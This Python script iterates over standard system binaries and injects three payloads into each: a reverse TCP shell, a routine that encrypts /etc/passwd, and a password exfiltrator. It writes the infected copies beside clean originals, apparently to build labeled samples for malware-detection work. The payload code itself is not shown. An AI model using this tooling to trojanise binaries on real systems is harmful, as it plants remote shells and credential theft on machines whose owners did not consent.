import subprocess
from pathlib import Path

from file_system import get_output_filepath
from file_system import get_standard_bins
from file_system import InjectionVariant
from injection import inject_binary

project_root = Path(__file__).parent.parent.parent


class MKPKFiles:
    REVERSE_TCP = project_root / "mkpk/exec_bin_sh.mkpk"
    ENCRYPT_PASSWD = project_root / "mkpk/enc_etcpasswd.mkpk"
    EGRESS_PASSWDS = project_root / "mkpk/egress_passwd.mkpk"


def main():
    """
    Iterate through each file in /usr/bin, and:
    1. Inject each file in mkpk/* into the bin.
    2. Store in /bin/file/{name}
    """
    for bin_path in get_standard_bins(100):
        print(f"Runing injection for {bin_path}")
        bin_name = Path(bin_path).name
        inject_binary(
            str(MKPKFiles.REVERSE_TCP),
            bin_path,
            get_output_filepath(bin_name, InjectionVariant.REVERSE_TCP),
        )
        inject_binary(
            str(MKPKFiles.ENCRYPT_PASSWD),
            bin_path,
            get_output_filepath(bin_name, InjectionVariant.ENCRYPT_PASSWD),
        )
        inject_binary(
            str(MKPKFiles.EGRESS_PASSWDS),
            bin_path,
            get_output_filepath(bin_name, InjectionVariant.EGRESS_PASSWDS),
        )

        # Also copy the original over
        command: str = (
            "cp "
            f"{bin_path} "
            f"{get_output_filepath(bin_name, InjectionVariant.NONE)}"
        )
        subprocess.run(command, shell=True, stdout=subprocess.DEVNULL)


if __name__ == "__main__":
    main()
